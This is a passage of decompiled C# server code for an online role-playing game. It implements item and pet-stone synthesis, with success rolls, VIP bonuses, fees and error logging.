								if (BitConverter.ToInt64(装备栏包裹[hcItimesClass77.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass77.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass78.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass78.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass79.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass79.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass80.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass80.物品全局ID, 0))
								{
									if (base.FLD_VIP == 1)
									{
										num57 += 40;
										num58 += 20;
									}
									int value71;
									switch (num60)
									{
									default:
										return;
									case 800000002:
										value71 = 800000002;
										if (num57 >= 0 && num57 <= 40)
										{
											text = "3";
										}
										else if (num57 > 40 && num57 <= 80)
										{
											text = "4";
										}
										else if (num57 > 80 && num57 <= 120)
										{
											text = "6";
										}
										else if (num57 > 120 && num57 <= 160)
										{
											text = "2";
										}
										else if (num57 > 160 && num57 <= 200)
										{
											text = "2";
										}
										else if (num57 > 200 && num57 <= 240)
										{
											text = "11";
										}
										switch (text)
										{
										case "11":
										{
											string[] array24 = World.再造寒玉石武防.Split(';');
											num59 = RNG.Next(int.Parse(array24[0]), int.Parse(array24[1]));
											break;
										}
										case "6":
										{
											string[] array23 = World.再造寒玉石回避.Split(';');
											num59 = RNG.Next(int.Parse(array23[0]), int.Parse(array23[1]));
											break;
										}
										case "4":
										{
											string[] array22 = World.再造寒玉石内功.Split(';');
											num59 = RNG.Next(int.Parse(array22[0]), int.Parse(array22[1]));
											break;
										}
										case "3":
										{
											string[] array21 = World.再造寒玉石生命.Split(';');
											num59 = RNG.Next(int.Parse(array21[0]), int.Parse(array21[1]));
											break;
										}
										case "2":
										{
											string[] array20 = World.再造寒玉石防御.Split(';');
											num59 = RNG.Next(int.Parse(array20[0]), int.Parse(array20[1]));
											break;
										}
										}
										if (num58 > 0 && num58 <= 40)
										{
											value71 = 800000002;
										}
										else if (num58 > 40 && num58 <= 80)
										{
											value71 = 800000024;
										}
										else if (num58 > 80 && num58 <= 135)
										{
											value71 = 800000062;
										}
										break;
									case 800000001:
										value71 = 800000001;
										if (num57 >= 0 && num57 <= 40)
										{
											text = "3";
										}
										else if (num57 > 40 && num57 <= 80)
										{
											text = "5";
										}
										else if (num57 > 80 && num57 <= 120)
										{
											text = "10";
										}
										else if (num57 > 120 && num57 <= 160)
										{
											text = "1";
										}
										else if (num57 > 160 && num57 <= 200)
										{
											text = "1";
										}
										else if (num57 > 200 && num57 <= 240)
										{
											text = "7";
										}
										switch (text)
										{
										case "10":
										{
											string[] array19 = World.再造金刚石追伤.Split(';');
											num59 = RNG.Next(int.Parse(array19[0]), int.Parse(array19[1]));
											break;
										}
										case "7":
										{
											string[] array18 = World.再造金刚石武功.Split(';');
											num59 = RNG.Next(int.Parse(array18[0]), int.Parse(array18[1]));
											break;
										}
										case "5":
										{
											string[] array17 = World.再造金刚石命中.Split(';');
											num59 = RNG.Next(int.Parse(array17[0]), int.Parse(array17[1]));
											break;
										}
										case "3":
										{
											string[] array16 = World.再造金刚石生命.Split(';');
											num59 = RNG.Next(int.Parse(array16[0]), int.Parse(array16[1]));
											break;
										}
										case "1":
										{
											string[] array15 = World.再造金刚石攻击.Split(';');
											num59 = RNG.Next(int.Parse(array15[0]), int.Parse(array15[1]));
											break;
										}
										}
										if (num58 > 0 && num58 <= 40)
										{
											value71 = 800000001;
										}
										else if (num58 > 40 && num58 <= 80)
										{
											value71 = 800000023;
										}
										else if (num58 > 80 && num58 <= 135)
										{
											value71 = 800000061;
										}
										break;
									}
									switch (num59.ToString().Length)
									{
									case 1:
										value70 = int.Parse(text + "0000" + num59);
										break;
									case 2:
										value70 = int.Parse(text + "000" + num59);
										break;
									case 3:
										value70 = int.Parse(text + "00" + num59);
										break;
									case 4:
										value70 = int.Parse(text + "0" + num59);
										break;
									case 5:
										value70 = int.Parse(text + num59);
										break;
									}
									减去物品(hcItimesClass77.位置, 1);
									减去物品(hcItimesClass78.位置, 1);
									减去物品(hcItimesClass79.位置, 1);
									减去物品(hcItimesClass80.位置, 1);
									增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value71), hcItimesClass77.位置, BitConverter.GetBytes(1), BitConverter.GetBytes(value70));
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
								end_IL_425d:;
							}
							catch (Exception ex64)
							{
								Form1.WriteLine(1, "合成系统 再造合成石-确认再造 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex64.Message);
							}
							goto default;
						case 32:
							try
							{
								if (base.当前操作类型 == 14 && (装备栏包裹[num2].Get物品ID == 800000001L || 装备栏包裹[num2].Get物品ID == 800000002L) && 合成物品表.Count < 4)
								{
									if (!合成物品表.ContainsKey(1))
									{
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, new HcItimesClass
										{
											位置 = num2,
											物品 = 装备栏包裹[num2].物品_byte
										});
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
									else if (!合成物品表.ContainsKey(2))
									{
										HcItimesClass value95 = new HcItimesClass();
										if (合成物品表.TryGetValue(1, out value95))
										{
											if (装备栏包裹[num2].Get物品ID == BitConverter.ToInt32(value95.物品id, 0))
											{
												装备栏包裹[num2].锁定 = true;
												合成物品表.Add(2, new HcItimesClass
												{
													位置 = num2,
													物品 = 装备栏包裹[num2].物品_byte
												});
												合成提示(num, 1, 0, 装备栏包裹[num2]);
											}
											else
											{
												合成提示(num, 9, 0, 装备栏包裹[num2]);
											}
										}
									}
									else if (!合成物品表.ContainsKey(3))
									{
										HcItimesClass value96 = new HcItimesClass();
										if (合成物品表.TryGetValue(1, out value96))
										{
											if (装备栏包裹[num2].Get物品ID == BitConverter.ToInt32(value96.物品id, 0))
											{
												装备栏包裹[num2].锁定 = true;
												合成物品表.Add(3, new HcItimesClass
												{
													位置 = num2,
													物品 = 装备栏包裹[num2].物品_byte
												});
												合成提示(num, 1, 0, 装备栏包裹[num2]);
											}
											else
											{
												合成提示(num, 9, 0, 装备栏包裹[num2]);
											}
										}
									}
									else if (!合成物品表.ContainsKey(4))
									{
										HcItimesClass value97 = new HcItimesClass();
										if (合成物品表.TryGetValue(1, out value97))
										{
											if (装备栏包裹[num2].Get物品ID == BitConverter.ToInt32(value97.物品id, 0))
											{
												装备栏包裹[num2].锁定 = true;
												合成物品表.Add(4, new HcItimesClass
												{
													位置 = num2,
													物品 = 装备栏包裹[num2].物品_byte
												});
												合成提示(num, 1, 0, 装备栏包裹[num2]);
											}
											else
											{
												合成提示(num, 9, 0, 装备栏包裹[num2]);
											}
										}
									}
								}
							}
							catch (Exception ex93)
							{
								Form1.WriteLine(1, "合成系统 再造合成石-放合成石 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex93.Message);
							}
							goto default;
						case 89:
							try
							{
								HcItimesClass value73;
								if (合成物品表.TryGetValue(1, out value73))
								{
									装备栏包裹[value73.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
									合成提示(num, 1, 0, 装备栏包裹[value73.位置]);
								}
							}
							catch (Exception ex67)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex67.Message);
							}
							goto default;
						case 79:
							try
							{
								HcItimesClass value68;
								if (合成物品表.TryGetValue(1, out value68))
								{
									装备栏包裹[value68.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value68.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex63)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 八卦回天符 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex63.Message);
							}
							goto default;
						case 81:
							try
							{
								if (!装备栏包裹[num2].锁定 && !合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass94 = new HcItimesClass();
									hcItimesClass94.位置 = num2;
									hcItimesClass94.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass94);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex74)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex74.Message);
							}
							goto default;
						case 82:
							try
							{
								if (合成物品表.Count == 0)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else if (!合成物品表.ContainsKey(2) && !装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定)
								{
									HcItimesClass hcItimesClass99 = new HcItimesClass();
									hcItimesClass99.位置 = num2;
									hcItimesClass99.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(2, hcItimesClass99);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex77)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex77.Message);
							}
							goto default;
						case 83:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									合成物品表.Add(3, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex57)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex57.Message);
							}
							goto default;
						case 119:
							try
							{
								HcItimesClass value88;
								if (合成物品表.TryGetValue(2, out value88))
								{
									装备栏包裹[value88.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
									合成提示(num, 1, 0, 装备栏包裹[value88.位置]);
								}
							}
							catch (Exception ex87)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex87.Message);
							}
							goto default;
						case 100:
							try
							{
								HcItimesClass hcItimesClass114;
								HcItimesClass hcItimesClass115;
								HcItimesClass hcItimesClass116;
								if (base.当前操作类型 == 26 && 合成物品表.Count > 0)
								{
									hcItimesClass114 = null;
									hcItimesClass115 = null;
									hcItimesClass116 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass114 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass115 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass116 = 合成物品表[3];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass114.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass114.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass115.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass115.物品全局ID, 0) && (hcItimesClass116 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass116.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass116.物品全局ID, 0)))
									{
										hcItimesClass114.得到属性();
										hcItimesClass114.强化属性阶段();
										hcItimesClass115.强化属性阶段();
										ItmeClass value92;
										if (装备栏包裹[hcItimesClass114.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass114.位置]);
										}
										else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass114.物品id, 0), out value92))
										{
											if (value92.FLD_RESIDE2 != 23 && value92.FLD_RESIDE2 != 24 && value92.FLD_RESIDE2 != 25)
											{
												Form1.WriteLine(6, "合成系统 WGF BUG11[" + BitConverter.ToInt32(hcItimesClass114.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass115.物品id, 0) + "]");
											}
											else
											{
												if (合成手续费 <= 0)
												{
													goto IL_5561;
												}
												if (base.Player_Money >= 合成手续费)
												{
													base.Player_Money -= 合成手续费;
													更新金钱和负重();
													goto IL_5561;
												}
												合成提示(11, 4, 0, 装备栏包裹[hcItimesClass114.位置]);
												合成物品表.Clear();
											}
										}
									}
								}
								goto end_IL_531e;
								IL_5561:
								if (hcItimesClass114.强化数量 > 0)
								{
									Form1.WriteLine(6, "合成系统 先强后合 BUG1[" + base.Userid + "]-[" + base.UserName + "]");
								}
								else
								{
									double num69 = RNG.Next(0, 110);
									int num70 = hcItimesClass115.阶段数量;
									if (num70 > 10)
									{
										if (num70 > 10 && num70 <= 20)
										{
											num70 = 10;
										}
										else if (num70 > 20 && num70 <= 30)
										{
											num70 = 15;
										}
										else if (num70 > 30 && num70 <= 40)
										{
											num70 = 20;
										}
										else if (num70 > 40 && num70 <= 50)
										{
											num70 = 20;
										}
										else if (num70 > 50 && num70 <= 60)
										{
											num70 = 25;
										}
										else if (num70 > 60 && num70 <= 70)
										{
											num70 = 30;
										}
										else if (num70 > 70 && num70 <= 80)
										{
											num70 = 35;
										}
										if (num70 > 80 && num70 <= 100)
										{
											num70 = 50;
										}
									}
									double num71 = hcItimesClass114.属性1.数量 * 20 + hcItimesClass114.属性2.数量 * 20 + hcItimesClass114.属性3.数量 * 20 + hcItimesClass114.属性4.数量 * 20 + num70;
									if (hcItimesClass114.属性1.属性数量 == 0 || hcItimesClass114.属性2.属性数量 == 0 || hcItimesClass114.属性3.属性数量 == 0 || hcItimesClass114.属性4.属性数量 == 0)
									{
										if (hcItimesClass116 != null)
										{
											num69 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass116.物品id, 0));
										}
										if (元宝合成开关 == 1)
										{
											num69 += 5.0;
										}
										if (base.FLD_VIP == 1)
										{
											num69 += 100.0 * World.VIP合成率增加百分比;
										}
										if (World.合成率 != 0.0)
										{
											num69 += 100.0 * World.合成率;
										}
										if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
										{
											num69 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
										}
										if (base.FLD_VIP == 8)
										{
											num71 = 0.0;
										}
										if (num69 >= num71)
										{
											if (hcItimesClass114.属性1.属性类型 == 0)
											{
												if (hcItimesClass115.阶段类型 == 8)
												{
													hcItimesClass114.属性1.气功属性类型 = hcItimesClass115.气功属性类型;
												}
												hcItimesClass114.属性1.属性类型 = hcItimesClass115.阶段类型;
												hcItimesClass114.属性1.属性数量 = hcItimesClass115.阶段数量;
												hcItimesClass114.设置属性();
											}
											else if (hcItimesClass114.属性2.属性类型 == 0)
											{
												if (hcItimesClass115.阶段类型 == 8)
												{
													hcItimesClass114.属性2.气功属性类型 = hcItimesClass115.气功属性类型;
												}
												hcItimesClass114.属性2.属性类型 = hcItimesClass115.阶段类型;
												hcItimesClass114.属性2.属性数量 = hcItimesClass115.阶段数量;
												hcItimesClass114.设置属性();
											}
											else if (hcItimesClass114.属性3.属性类型 == 0)
											{
												if (hcItimesClass115.阶段类型 == 8)
												{
													hcItimesClass114.属性3.气功属性类型 = hcItimesClass115.气功属性类型;
												}
												hcItimesClass114.属性3.属性类型 = hcItimesClass115.阶段类型;
												hcItimesClass114.属性3.属性数量 = hcItimesClass115.阶段数量;
												hcItimesClass114.设置属性();
											}
											else if (hcItimesClass114.属性4.属性类型 == 0)
											{
												if (hcItimesClass115.阶段类型 == 8)
												{
													hcItimesClass114.属性4.气功属性类型 = hcItimesClass115.气功属性类型;
												}
												hcItimesClass114.属性4.属性类型 = hcItimesClass115.阶段类型;
												hcItimesClass114.属性4.属性数量 = hcItimesClass115.阶段数量;
												hcItimesClass114.设置属性();
											}
											合成提示(num, 1, 0, 装备栏包裹[hcItimesClass114.位置]);
										}
										else
										{
											合成提示(num, 0, 0, 装备栏包裹[hcItimesClass114.位置]);
										}
										减去物品(hcItimesClass115.位置, 1);
										if (hcItimesClass116 != null)
										{
											减去物品(hcItimesClass116.位置, 1);
										}
										if (BitConverter.ToInt32(装备栏包裹[hcItimesClass114.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass114.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass114.物品全局ID, 0))
										{
											减去物品(hcItimesClass114.位置, 1);
											增加物品(hcItimesClass114.物品全局ID, hcItimesClass114.物品id, hcItimesClass114.位置, hcItimesClass114.物品数量, hcItimesClass114.物品属性);
										}
										装备栏包裹[hcItimesClass114.位置].锁定 = false;
										合成物品表.Clear();
										合成系统解锁();
										元宝合成开关 = 0;
										合成手续费 = 0;
									}
								}
								end_IL_531e:;
							}
							catch (Exception ex91)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex91.Message);
							}
							goto default;
						case 101:
							try
							{
								ItmeClass value91;
								if (!合成物品表.ContainsKey(1) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value91) && (value91.FLD_RESIDE2 == 23 || value91.FLD_RESIDE2 == 24 || value91.FLD_RESIDE2 == 25) && (装备栏包裹[num2].FLD_MAGIC1 == 0 || 装备栏包裹[num2].FLD_MAGIC2 == 0 || 装备栏包裹[num2].FLD_MAGIC3 == 0 || 装备栏包裹[num2].FLD_MAGIC4 == 0))
								{
									int 钱数5 = 合成手续费 = 计算合成强化费用(value91, num2, num);
									HcItimesClass hcItimesClass113 = new HcItimesClass();
									hcItimesClass113.位置 = num2;
									hcItimesClass113.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass113);
									合成提示(num, 1, 钱数5, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex90)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex90.Message);
							}
							goto default;
						case 102:
							try
							{
								if (合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass112 = 合成物品表[1];
									ItmeClass value89;
									ItmeClass value90;
									if (!装备栏包裹[num2].物品绑定 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value89) && (value89.FLD_PID == 800000032 || value89.FLD_PID == 800000033) && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass112.物品id, 0), out value90) && (value89.FLD_PID != 800000032 || value90.FLD_JOB_LEVEL < 3) && (value89.FLD_PID != 800000033 || value90.FLD_JOB_LEVEL >= 3) && 合成物品表.Count != 0 && !合成物品表.ContainsKey(2))
									{
										合成物品表.Add(2, new HcItimesClass
										{
											位置 = num2,
											物品 = 装备栏包裹[num2].物品_byte
										});
										装备栏包裹[num2].锁定 = true;
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex89)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex89.Message);
							}
							goto default;
						case 103:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									合成物品表.Add(3, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex7)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex7.Message);
							}
							goto default;
						case 109:
							try
							{
								HcItimesClass value85;
								if (合成物品表.TryGetValue(1, out value85))
								{
									装备栏包裹[value85.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value85.位置]);
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
								}
							}
							catch (Exception ex84)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex84.Message);
							}
							goto default;
						case 110:
							if (base.当前操作类型 == 27 && 人物灵兽 != null && 合成物品表.Count > 0)
							{
								HcItimesClass hcItimesClass117 = null;
								HcItimesClass hcItimesClass118 = null;
								if (合成物品表.ContainsKey(2))
								{
									hcItimesClass117 = 合成物品表[2];
								}
								if (合成物品表.ContainsKey(3))
								{
									hcItimesClass118 = 合成物品表[3];
								}
								ItmeClass value93;
								if (BitConverter.ToInt64(装备栏包裹[hcItimesClass117.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass117.物品全局ID, 0) && (hcItimesClass118 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass118.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass118.物品全局ID, 0)) && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass117.物品id, 0), out value93) && (value93.FLD_PID == 800000030 || value93.FLD_PID == 800000031))
								{
									hcItimesClass117.强化属性阶段();
									if (人物灵兽.FLD_MAGIC1 == 0 || 人物灵兽.FLD_MAGIC2 == 0 || 人物灵兽.FLD_MAGIC3 == 0 || 人物灵兽.FLD_MAGIC4 == 0 || 人物灵兽.FLD_MAGIC5 == 0)
									{
										int num72 = (value93.FLD_PID != 800000030) ? 100000 : 50000;
										if (base.Player_Money < num72)
										{
											try
											{
												HcItimesClass value94;
												if (合成物品表.TryGetValue(1, out value94))
												{
													装备栏包裹[value94.位置].锁定 = false;
													合成物品表.Clear();
													合成系统解锁();
													合成提示(num, 0, 0, 装备栏包裹[num2]);
												}
												元宝合成开关 = 0;
												合成提示(29, 0, 0, 装备栏包裹[num2]);
												系统提示("金额不足,需要支付" + num72 + "两游戏币。");
											}
											catch (Exception ex92)
											{
												元宝合成开关 = 0;
												Form1.WriteLine(1, "合成系统 先强后合 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex92.Message);
											}
										}
										else
										{
											base.Player_Money -= num72;
											更新金钱和负重();
											double num73 = RNG.Next(0, 110);
											double num74 = hcItimesClass117.阶段数量;
											if (人物灵兽.FLD_MAGIC1 != 0)
											{
												num74 += 20.0;
											}
											if (人物灵兽.FLD_MAGIC2 != 0)
											{
												num74 += 20.0;
											}
											if (人物灵兽.FLD_MAGIC3 != 0)
											{
												num74 += 20.0;
											}
											if (人物灵兽.FLD_MAGIC4 != 0)
											{
												num74 += 20.0;
											}
											if (hcItimesClass118 != null)
											{
												num73 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass118.物品id, 0));
											}
											if (元宝合成开关 == 1)
											{
												num73 += 5.0;
											}
											if (base.FLD_VIP == 1)
											{
												num73 += 100.0 * World.VIP合成率增加百分比;
											}
											if (World.合成率 != 0.0)
											{
												num73 += 100.0 * World.合成率;
											}
											if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
											{
												num73 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
											}
											if (base.FLD_VIP == 8)
											{
												num74 = 0.0;
											}
											if (num73 >= num74)
											{
												if (人物灵兽.FLD_MAGIC1 == 0)
												{
													if (hcItimesClass117.阶段数量.ToString().Length == 1)
													{
														人物灵兽.FLD_MAGIC1 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
													}
													else if (hcItimesClass117.阶段数量.ToString().Length == 2)
													{
														人物灵兽.FLD_MAGIC1 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
													}
												}
												else if (人物灵兽.FLD_MAGIC2 == 0)
												{
													if (hcItimesClass117.阶段数量.ToString().Length == 1)
													{
														人物灵兽.FLD_MAGIC2 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
													}
													else if (hcItimesClass117.阶段数量.ToString().Length == 2)
													{
														人物灵兽.FLD_MAGIC2 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
													}
												}
												else if (人物灵兽.FLD_MAGIC3 == 0)
												{
													if (hcItimesClass117.阶段数量.ToString().Length == 1)
													{
														人物灵兽.FLD_MAGIC3 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
													}
													else if (hcItimesClass117.阶段数量.ToString().Length == 2)
													{
														人物灵兽.FLD_MAGIC3 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
													}
												}
												else if (人物灵兽.FLD_MAGIC4 == 0)
												{
													if (hcItimesClass117.阶段数量.ToString().Length == 1)
													{
														人物灵兽.FLD_MAGIC4 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
													}
													else if (hcItimesClass117.阶段数量.ToString().Length == 2)
													{
														人物灵兽.FLD_MAGIC4 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
													}
												}
												else if (人物灵兽.FLD_MAGIC5 == 0)
												{
													if (hcItimesClass117.阶段数量.ToString().Length == 1)
													{
														人物灵兽.FLD_MAGIC5 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
													}
													else if (hcItimesClass117.阶段数量.ToString().Length == 2)
													{
														人物灵兽.FLD_MAGIC5 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
													}
												}
												更新灵兽武功和状态();
												合成提示(num, 1, 0, 装备栏包裹[num2]);
											}
											else
											{
												合成提示(num, 0, 0, 装备栏包裹[num2]);
											}
											减去物品(hcItimesClass117.位置, 1);
											if (hcItimesClass118 != null)
											{
												减去物品(hcItimesClass118.位置, 1);
											}
											合成物品表.Clear();
											合成系统解锁();
											元宝合成开关 = 0;
										}
									}
								}
							}
							goto default;
						case 112:
							try
							{
								if (!合成物品表.ContainsKey(2) && 人物灵兽 != null && (人物灵兽.FLD_MAGIC1 == 0 || 人物灵兽.FLD_MAGIC2 == 0 || 人物灵兽.FLD_MAGIC3 == 0 || 人物灵兽.FLD_MAGIC4 == 0 || 人物灵兽.FLD_MAGIC5 == 0))
								{
									int num65 = BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0);
									if (num65 != 0 && (uint)(num65 - 800000030) <= 1u)
									{
										switch (人物灵兽.FLD_JOB_LEVEL)
										{
										case 3:
											if (num65 != 800000031)
											{
												return;
											}
											break;
										case 0:
										case 1:
										case 2:
											if (num65 != 800000030)
											{
												return;
											}
											break;
										}
										合成物品表.Add(2, new HcItimesClass
										{
											位置 = num2,
											物品 = 装备栏包裹[num2].物品_byte
										});
										装备栏包裹[num2].锁定 = true;
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
									return;
								}
							}
							catch (Exception ex81)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex81.Message);
							}
							goto default;
						case 113:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									合成物品表.Add(3, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex17)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex17.Message);
							}
							goto default;
						case 260:
							try
							{
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex78)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化转移符[武器] 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex78.Message);
							}
							goto default;
						case 261:
							try
							{
								int num64 = BitConverter.ToUInt16(封包数据, 14);
								if (装备栏包裹[num64].Get物品ID == 1008001061L || 装备栏包裹[num64].Get物品ID == 1008001062L)
								{
									int num9 = BitConverter.ToInt32(封包数据, 8);
									if ((uint)(num9 - 1008001061) <= 1u && !装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定 && 装备栏包裹[num2].FLD_强化数量 >= 11)
									{
										ItmeClass value82;
										if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value82))
										{
											if (value82.FLD_LEVEL == 130)
											{
												if (value82.FLD_RESIDE2 == 4)
												{
													if (装备栏包裹[num64].Get物品ID != 1008001061L)
													{
														return;
													}
												}
												else if (value82.FLD_RESIDE2 != 1 || 装备栏包裹[num64].Get物品ID != 1008001062L)
												{
													return;
												}
												if (!合成物品表.ContainsKey(1))
												{
													HcItimesClass hcItimesClass100 = new HcItimesClass();
													hcItimesClass100.位置 = num2;
													hcItimesClass100.物品 = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].锁定 = true;
													合成物品表.Add(1, hcItimesClass100);
													合成提示(num, 1, 0, 装备栏包裹[num2]);
												}
											}
										}
										else
										{
											合成提示(num, 0, 0, 装备栏包裹[num2]);
										}
									}
									return;
								}
							}
							catch (Exception ex80)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex80.Message);
							}
							goto default;
						case 262:
							try
							{
								int num63 = BitConverter.ToUInt16(封包数据, 14);
								if (装备栏包裹[num63].Get物品ID == 1008001061L || 装备栏包裹[num63].Get物品ID == 1008001062L)
								{
									int num9 = BitConverter.ToInt32(封包数据, 18);
									if ((uint)(num9 - 1008001061) <= 1u && !装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定)
									{
										ItmeClass value80;
										if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value80))
										{
											if (value80.FLD_LEVEL == 140)
											{
												if (value80.FLD_RESIDE2 == 4)
												{
